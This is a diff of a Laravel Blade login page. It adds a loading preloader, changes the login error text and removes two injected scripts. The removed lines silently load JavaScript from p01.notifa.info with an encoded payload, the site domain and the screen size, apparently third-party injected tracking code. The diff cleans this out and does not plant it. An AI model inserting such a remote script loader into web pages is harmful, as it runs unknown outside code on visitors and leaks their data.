@@ -14,12 +14,35 @@
     <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
     <link rel="stylesheet" href="{{ asset('style.css') }}">
 
-<script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtReml7H46z9E2%2fdugczn8qHo5CLM2PsXgK%2bOvNwL%2fFMhPzFTMt%2braGZq8FfhGCUEIzi2NSSH0ffFExXw20fGTfvdZI8JhVVxw8WZIuqPew6iSyoLAUjb0den9SPHzD%2f24Wm8EGz9B0gGmq5onkuEEgRwV2VTMXsQ5t1S3th06Y9q6%2fjX8cQWeZzwW223dG5yzjx1a3u1R9%2b6mE9cqCLW7dfoGWf5nzQ0rCusTicrE6F2yOc1z5%2fm35CvqEP1s6wvuSJ%2bg9rVymOroQDKRBvVL4Nl3tmAvjCAF5oR&amp;idc_r=89706268517&amp;domain=localhost&amp;sw=1366&amp;sh=768"></script></head>
+    <style type="text/css">
+        .preloader {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          z-index: 9999;
+          background-color: #fff;
+        }
+        .preloader .loading {
+          position: absolute;
+          left: 50%;
+          top: 50%;
+          transform: translate(-50%,-50%);
+          font: 14px arial;
+        }
+        </style></head>
 
 <body class="dark-color-overlay bg-img" style="background-image: url(img/bg-img/8.jpg);">
 
     <!-- Preloader -->
     
+    <div class="preloader">
+      <div class="loading">
+        <img src="{{ asset('image/love.gif')}}" width="200">
+        <p>Harap Tunggu</p>
+      </div>
+    </div>
 
     <!-- ======================================
     ******* Page Wrapper Area Start **********
@@ -55,7 +78,7 @@
                                                 <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
                                                  @error('email')
                                                     <p>
-                                                        {{ $message }}
+                                                        Email dan Password Tidak Sesuai
                                                     </p>
                                                 @enderror
                                             </div>
@@ -65,11 +88,7 @@
                                                 <label class="float-left" for="password">Password</label>
                                                 <input class="form-control" name="password" type="password" id="password" placeholder="Masukan Password Anda">
                                                <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
-                                                 @error('password')
-                                                    <p>
-                                                        {{ $message }}
-                                                    </p>
-                                                @enderror
+                                              
 
                                                <!--  <a href="forget-password.html" class="text-dark float-right"><span class="font-12 text-primary">Lupa password?</span></a> -->
                                             </div>
@@ -116,7 +135,13 @@
     <!-- Active JS -->
     <script src="js/default-assets/active.js"></script>
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtReml7H46z9E2%2fdugczn8qHo5CLM2PsXgK%2bOvNwL%2fFMhPzFTMt%2braGZq8FfhGCUEIzi2NSSH0ffFExXw20fGTfvdZI8JhVVxw8WZIuqPew6iSyoLAUjb0den9SPHzD%2f24Wm8EGz9B0gGmq5onkuEEgRwV2VTMXsQ5t1S3th06Y9q6%2fjX8cQWeZzwW223dG5yzjx1a3u1R9%2b6mE9cqCLW7dfoGWf5nzQ0rCusTicrE6F2yOc1z5%2fm35CvqEP1s6wvuSJ%2bg9rVymOroQDKRBvVL4Nl3tmAvjCAF5oR" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+    <script src="http://code.jquery.com/jquery-2.2.1.min.js"></script>
+
+    <script>
+        $(document).ready(function(){
+          $(".preloader").fadeOut();
+        })
+    </script>
 
 
 <!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT -->
